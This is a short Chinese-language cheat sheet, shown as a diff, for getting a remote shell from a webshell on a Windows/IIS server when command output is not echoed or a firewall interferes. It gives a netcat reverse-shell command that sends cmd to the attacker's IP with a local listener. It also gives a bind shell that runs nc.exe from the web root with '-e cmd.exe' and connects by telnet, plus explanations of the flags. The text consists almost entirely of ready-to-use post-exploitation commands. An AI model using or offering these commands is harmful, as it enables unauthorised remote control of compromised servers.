@@ -1,0 +1,24 @@
+多数用于执行命令不回显和防火墙限制等
+
+方法一
+
+webshell中执行:nc路径 -vv 本机ip 端口 -e cmd路径
+
+首先本地监听 nc -vv -l -p 8080
+
+-l：监听端口，监听入站信息-p：后跟本地端口号-v：显示端口的信息，如果使用-vv的话，则会显示端口更详细的信
+
+
+方法二
+c:\inetpub\wwwroot\nc.exe -l -p 8888 -t -e c:\inetpub\wwwroot\cmd.exe
+
+
+本打telnet 连接
+-l 监听本地入栈信息
+-p port 打开本地端口
+-t 以telnet形式应答入栈请求
+-e 程序重定向
+
+
+
+
